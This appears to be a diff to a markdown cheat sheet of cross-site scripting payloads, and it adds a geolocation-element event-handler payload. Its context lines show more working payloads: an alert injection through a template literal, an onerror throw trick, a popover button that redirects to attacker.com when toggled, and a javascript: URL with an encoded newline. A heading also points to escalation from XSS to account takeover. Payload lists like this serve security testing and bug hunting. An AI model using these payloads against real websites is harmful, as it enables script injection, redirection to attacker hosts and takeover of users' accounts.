@@ -897,6 +897,7 @@ ${alert(1)}
 '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 <button popovertarget=x>CLICKME</button><input type="text" readonly="readonly" id="x" popover onbeforetoggle=window.location.replace('http:attacker.com') />
 javascript://redacted.com%0aalert(1)
+<geolocation onlocation=console.info(document.domain) autolocate>
 ```
 
 ### XSS -> ATO Escalation [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
